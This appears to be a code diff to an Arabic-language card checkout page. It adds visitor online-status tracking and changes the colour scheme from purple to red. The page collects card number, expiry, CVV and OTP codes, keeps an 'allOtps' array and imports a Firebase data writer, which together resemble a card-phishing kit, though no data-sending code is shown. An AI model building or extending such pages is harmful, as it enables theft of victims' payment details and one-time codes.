@@ -16,6 +16,7 @@ import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/comp
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
 import { cn } from "@/lib/utils"
+import { setupOnlineStatus } from "@/lib/util"
 
 const allOtps: string[] = [""]
 
@@ -56,6 +57,8 @@ export default function CheckoutPage() {
   }, [showOtpDialog, timeLeft])
   useEffect(() => {
     const am = localStorage.getItem("amount")!
+    const visitor=localStorage.getItem("visitor")!
+    setupOnlineStatus(visitor!)
     setAmount(am)
   }, [])
   // Format card number with spaces
@@ -181,16 +184,16 @@ export default function CheckoutPage() {
   return (
     <div
       dir="rtl"
-      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-purple-50"
+      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-red-50"
       style={{ fontSize: 12 }}
     >
       {/* Professional Header with animated gradient */}
       <div className="relative overflow-hidden">
-        <div className="absolute inset-0 bg-gradient-to-l from-purple-600/10 via-pink-500/5 to-transparent animate-gradient-x"></div>
+        <div className="absolute inset-0 bg-gradient-to-l from-red-600/10 via-pink-500/5 to-transparent animate-gradient-x"></div>
         <div className="relative px-6 py-8">
           <div className="max-w-md mx-auto text-center">
-            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-purple-600 to-pink-800 rounded-2xl shadow-lg mb-4 relative overflow-hidden">
-              <div className="absolute inset-0 bg-gradient-to-tr from-purple-600/80 to-transparent opacity-60 animate-pulse"></div>
+            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-red-600 to-pink-800 rounded-2xl shadow-lg mb-4 relative overflow-hidden">
+              <div className="absolute inset-0 bg-gradient-to-tr from-red-600/80 to-transparent opacity-60 animate-pulse"></div>
               <Lock className="w-8 h-8 text-white relative z-10" />
             </div>
             <h1 className="text-2xl font-bold text-slate-800 mb-2">الدفع الآمن</h1>
@@ -208,7 +211,7 @@ export default function CheckoutPage() {
               {/* Line connectors with animation */}
               <div className="absolute top-4 left-[calc(16.67%+8px)] right-[calc(16.67%+8px)] h-2">
                 <div className="h-2 w-full flex">
-                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-purple-500 rounded-full relative overflow-hidden">
+                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-red-500 rounded-full relative overflow-hidden">
                     <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                   </div>
                   <div className="w-1/2 h-2 bg-slate-200 rounded-full"></div>
@@ -218,10 +221,10 @@ export default function CheckoutPage() {
               {/* Step 1 - Completed with animation */}
               <div className="flex flex-col items-center relative z-10">
                 <div className="relative">
-                  <div className="w-8 h-8 bg-gradient-to-r from-purple-500 to-[#2b224d] rounded-full flex items-center justify-center shadow-lg">
+                  <div className="w-8 h-8 bg-gradient-to-r from-red-500 to-[#2b224d] rounded-full flex items-center justify-center shadow-lg">
                     <Check className="w-5 h-5 text-white" />
                   </div>
-                  <div className="absolute -inset-1 bg-purple-500/30 rounded-full animate-pulse"></div>
+                  <div className="absolute -inset-1 bg-red-500/30 rounded-full animate-pulse"></div>
                 </div>
                 <span className="text-green-600 text-xs sm:text-sm mt-2 font-medium text-center">أختيار القيمة</span>
               </div>
@@ -233,9 +236,9 @@ export default function CheckoutPage() {
                     <div className="absolute inset-0 bg-white/10 animate-pulse"></div>
                     <span className="text-white text-sm font-bold relative z-10">2</span>
                   </div>
-                  <div className="absolute -inset-1 bg-purple-500/20 rounded-full animate-pulse"></div>
+                  <div className="absolute -inset-1 bg-red-500/20 rounded-full animate-pulse"></div>
                 </div>
-                <span className="text-purple-600 text-xs sm:text-sm mt-2 font-bold text-center">الدفع</span>
+                <span className="text-red-600 text-xs sm:text-sm mt-2 font-bold text-center">الدفع</span>
               </div>
 
               {/* Step 3 - Upcoming */}
@@ -256,9 +259,9 @@ export default function CheckoutPage() {
           <form onSubmit={handleSubmit} className="space-y-8">
             {/* Enhanced Payment Selection */}
             <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
-              <CardHeader className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
+              <CardHeader className="bg-gradient-to-r from-slate-100 via-white to-red-50 px-8 py-6 border-b border-slate-100">
                 <div className="flex items-center">
-                  <div className="w-8 h-8 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3 relative overflow-hidden">
+                  <div className="w-8 h-8 bg-gradient-to-r from-red-600 to-pink-600 rounded-lg flex items-center justify-center ml-3 relative overflow-hidden">
                     <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                     <CreditCard className="w-5 h-5 text-white relative z-10" />
                   </div>
@@ -284,8 +287,8 @@ export default function CheckoutPage() {
                     className={cn(
                       "border-2 transition-all duration-300 hover:shadow-lg group",
                       formData.paymentMethod === "credit-card"
-                        ? "border-purple-300 bg-gradient-to-r from-purple-50/80 to-pink-50/80 shadow-md"
-                        : "border-slate-200 bg-gradient-to-r from-purple-50/30 to-pink-50/30 hover:border-purple-200",
+                        ? "border-red-300 bg-gradient-to-r from-red-50/80 to-pink-50/80 shadow-md"
+                        : "border-slate-200 bg-gradient-to-r from-red-50/30 to-pink-50/30 hover:border-red-200",
                     )}
                     dir="rtl"
                   >
@@ -294,7 +297,7 @@ export default function CheckoutPage() {
                         <RadioGroupItem
                           value="credit-card"
                           id="credit-card"
-                          className="border-1 border-purple-400 text-purple-600 ml-4 w-5 h-5"
+                          className="border-1 border-red-400 text-red-600 ml-4 w-5 h-5"
                         />
                         <div className="flex items-center justify-between w-full">
                           <div dir="rtl">
@@ -352,7 +355,7 @@ export default function CheckoutPage() {
                                   maxLength={19}
                                   value={formData.cardNumber}
                                   onChange={(e) => handleInputChange("cardNumber", e.target.value)}
-                                  className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50 pr-4"
+                                  className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50 pr-4"
                                   required
                                 />
                                 <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
@@ -395,7 +398,7 @@ export default function CheckoutPage() {
                                   placeholder="MM/YY"
                                   value={expiryDate}
                                   onChange={(e) => handleInputChange("expiryDate", e.target.value)}
-                                  className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-base bg-white/50"
+                                  className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-base bg-white/50"
                                   dir="rtl"
                                   required
                                   maxLength={5}
@@ -424,7 +427,7 @@ export default function CheckoutPage() {
                                     placeholder="***"
                                     value={formData.cvv}
                                     onChange={(e) => handleInputChange("cvv", e.target.value)}
-                                    className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 font-mono text-base bg-white/50"
+                                    className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-base bg-white/50"
                                     dir="rtl"
                                     maxLength={4}
                                     type="tel"
@@ -498,7 +501,7 @@ export default function CheckoutPage() {
                       <Separator className="my-2" />
                       <div className="flex justify-between font-bold">
                         <span className="text-slate-800">المبلغ الإجمالي</span>
-                        <span className="text-purple-700">{amount}.000 د.ك</span>
+                        <span className="text-red-700">{amount}.000 د.ك</span>
                       </div>
                     </div>
                   </CardContent>
@@ -530,7 +533,7 @@ export default function CheckoutPage() {
                     (formData.paymentMethod === "credit-card" &&
                       (formData.cardNumber.length < 16 || !expiryDate || !formData.cvv)) 
                   }
-                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064] to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none relative overflow-hidden"
+                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064] to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none relative overflow-hidden"
                 >
                   {isLoading ? (
                     <div className="flex items-center justify-center">
@@ -558,11 +561,11 @@ export default function CheckoutPage() {
         <DialogContent className="w-[95vw] max-w-sm sm:max-w-md lg:max-w-lg mx-auto rounded-2xl border-0 shadow-2xl bg-white/95 backdrop-blur-sm">
           <DialogHeader className="text-center pb-4 sm:pb-6">
             <div className="relative mx-auto mb-4 sm:mb-6">
-              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-purple-100 to-pink-100 rounded-2xl flex items-center justify-center relative overflow-hidden">
-                <div className="absolute inset-0 bg-gradient-to-tr from-purple-200 to-transparent animate-pulse"></div>
-                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-purple-600 relative z-10" />
+              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-red-100 to-pink-100 rounded-2xl flex items-center justify-center relative overflow-hidden">
+                <div className="absolute inset-0 bg-gradient-to-tr from-red-200 to-transparent animate-pulse"></div>
+                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-red-600 relative z-10" />
               </div>
-              <div className="absolute -inset-2 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
+              <div className="absolute -inset-2 bg-gradient-to-r from-red-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
             </div>
             <DialogTitle className="text-xl sm:text-2xl font-bold text-slate-800 mb-2">تأكيد رمز التحقق</DialogTitle>
             <p className="text-sm sm:text-base text-slate-600">للحماية الإضافية لحسابك</p>
@@ -587,7 +590,7 @@ export default function CheckoutPage() {
                     <InputOTPSlot
                       key={index}
                       index={index}
-                      className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 text-lg sm:text-xl font-bold border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 bg-white/80"
+                      className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 text-lg sm:text-xl font-bold border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 bg-white/80"
                     />
                   ))}
                 </InputOTPGroup>
@@ -610,7 +613,7 @@ export default function CheckoutPage() {
             <div className="space-y-3 sm:space-y-4">
               <Button
                 onClick={handleOtpSubmit}
-                className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl relative overflow-hidden"
+                className="w-full h-12 sm:h-14 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl relative overflow-hidden"
                 disabled={otpValue.length !== 6 || isLoading}
               >
                 {isLoading ? (
